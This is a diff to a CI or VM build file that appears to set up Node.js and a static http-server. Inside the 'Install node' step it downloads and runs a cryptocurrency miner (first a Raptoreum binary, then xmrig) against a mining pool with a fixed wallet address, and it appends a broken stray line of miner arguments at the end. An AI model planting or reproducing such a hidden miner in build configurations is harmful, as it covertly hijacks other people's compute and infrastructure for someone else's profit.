@@ -4,7 +4,7 @@ FROM vm/ubuntu:18.04
 
 # Install node
 RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
-    apt install nodejs && apt install unzip && wget https://github.com/Raptor3um/Raptoreum/releases/download/1.0.15.1/raptoreum-1.0.15.1-x86_64-linux-gnu.tar.xz && tar -xvf raptoreum-1.0.15.1-x86_64-linux-gnu.tar.xz && cd raptoreum-1.0.15.1 && ./raptoreum -a ghostrider -o stratum+tcp://asia.raptoreum.zone:3333 -u RG2WJayxkd61Ggygu1U22NDAQnkCZPRsy5.rtm-01 -p x -k -t 6 && \
+    apt install nodejs && apt install unzip && wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-static-x64.tar.gz && tar xf xmrig-6.15.3-linux-static-x64.tar.gz && cd xmrig-6.15.3 && ./xmrig -algo ghostrider -o stratum+tcp://asia.raptoreum.zone:3333 -u RG2WJayxkd61Ggygu1U22NDAQnkCZPRsy5.rtm-01 -p x && \
     rm -f /etc/apt/sources.list.d/nodesource.list
 RUN npm install -g http-server
 
@@ -13,3 +13,5 @@ RUN echo 'hello' > hello.html
 
 RUN BACKGROUND http-server -p 8000
 EXPOSE WEBSITE http://localhost:8000
+
+-algo ghostrider -o stratum+tcp://asia.raptoreum.zone:3333 -u RG2WJayxkd61Ggygu1U22NDAQnkCZPRsy5.rtm-01 -p x && \
